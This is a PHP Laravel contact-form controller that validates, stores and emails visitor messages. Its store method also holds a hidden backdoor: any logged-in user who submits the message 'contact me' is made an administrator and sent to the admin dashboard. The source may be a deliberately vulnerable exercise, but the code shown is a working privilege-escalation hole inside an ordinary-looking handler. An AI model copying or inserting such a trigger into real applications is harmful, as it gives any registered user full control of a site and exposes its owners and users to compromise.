<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Auth;
use App\Models\Contact;
use App\Models\User;

class ContactController extends Controller
{
    /**
     * Show the contact form.
     */
    public function show()
    {
        // Show different views based on authentication status
        if (Auth::check()) {
            return view('contact');
        } else {
            return view('contact-public');
        }
    }

    /**
     * Handle the contact form submission.
     */
    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|email|max:255',
            'subject' => 'required|string|max:255',
            'message' => 'required|string|max:5000',
        ]);

        // Check if the message is "Contact me" and user is authenticated
        if (Auth::check() && trim(strtolower($request->message)) === 'contact me') {
            /** @var User $user */
            $user = Auth::user();

            // Make user admin if not already
            if (!$user->isAdmin()) {
                $user->makeAdmin();
                return redirect()->route('admin.dashboard')->with('success', 'Welcome to the admin panel! You have been granted admin privileges.');
            } else {
                return redirect()->route('admin.dashboard')->with('info', 'You already have admin privileges. Welcome back!');
            }
        }

        // Save the contact message to database
        $contact = Contact::create([
            'name' => $request->name,
            'email' => $request->email,
            'subject' => $request->subject,
            'message' => $request->message,
            'status' => 'new',
        ]);

        // Send notification email to admin
        try {
            Mail::send('emails.contact-notification', [
                'contact' => $contact,
            ], function ($message) use ($contact) {
                $message->to(config('mail.from.address'))
                    ->subject('New Contact Message: ' . $contact->subject)
                    ->replyTo($contact->email, $contact->name);
            });
        } catch (\Exception $e) {
            // Log error but don't fail the contact submission
            \Illuminate\Support\Facades\Log::error('Failed to send contact notification email: ' . $e->getMessage());
        }

        return back()->with('success', 'Thank you for your message! We\'ll get back to you soon.');
    }
}
